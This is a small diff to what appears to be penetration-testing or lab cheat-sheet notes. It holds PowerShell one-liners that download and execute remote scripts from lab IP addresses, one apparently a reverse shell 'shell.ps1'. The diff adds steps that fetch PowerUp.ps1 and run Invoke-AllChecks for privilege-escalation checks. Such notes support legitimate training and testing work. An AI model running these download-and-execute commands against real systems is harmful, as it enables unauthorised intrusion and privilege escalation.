@@ -176,3 +176,11 @@ powershell -c iex(new-object net.webclient).downloadstring(‘http://10.10.14.45
 cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.7:5555/shell.ps1')
 ```
 
+### Download PowerUp.ps1 to host
+```
+iex(new-object net.webclient).downloadstring('http://10.10.14.57/PowerUp.ps1')
+```
+### then run
+```
+Invoke-AllChecks
+```
